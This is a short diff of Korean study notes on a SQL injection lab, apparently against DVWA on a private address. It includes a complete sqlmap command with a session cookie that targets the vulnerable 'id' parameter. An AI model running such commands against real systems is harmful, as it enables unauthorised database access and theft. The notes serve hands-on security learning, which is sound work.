@@ -298,3 +298,6 @@ impossible
 - id 라는 파라미터가 취약하다는 것을 알고 있다.
 
 ![[Pasted image 20241008124727.png]]`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id`
+
+![[Pasted image 20241008124954.png]]
+- 총 4가지 sql injection에 대해서 id라는 파라미터가 갖는 취약점을 설명
